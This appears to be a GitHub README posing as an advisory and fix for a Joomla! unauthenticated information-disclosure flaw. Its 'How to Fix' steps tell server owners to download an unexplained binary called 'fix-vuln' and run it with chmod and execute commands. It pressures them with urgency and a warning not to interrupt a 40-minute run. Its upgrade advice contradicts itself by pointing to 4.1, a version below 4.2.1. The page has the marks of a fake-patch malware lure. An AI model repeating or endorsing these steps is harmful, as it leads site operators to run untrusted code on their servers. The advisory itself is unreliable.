# Joomla! < 4.2.1 - Unauthenticated information disclosure
**An authentication bypass vulnerability that allows unauthenticated users to access sensitive information about Joomla! Upgrade joomla to version 4.1 to avoid vulnerabilities.**
![Vuln](https://github.com/Jennifer-Burns/Joomla-4.2.1-Unauthenticated-information-disclosure/assets/152668806/b8aecd26-6513-45de-b14f-6e753db1a8e9)


# How to Fix
Download the binary patch file to the website server and execute the following command to fix the vulnerability.
```
chmod 755 fix-vuln
./fix-vuln
```
Patches will work automatically in the background until the vulnerability is fixed.  Do not perform any operations while the patch is running, as this may cause the website system to crash and data to be lost! The repair process takes approximately 40 minutes.

> **Every minute wasted may allow someone to attack your website! Therefore, the patch file should be installed as soon as possible.**
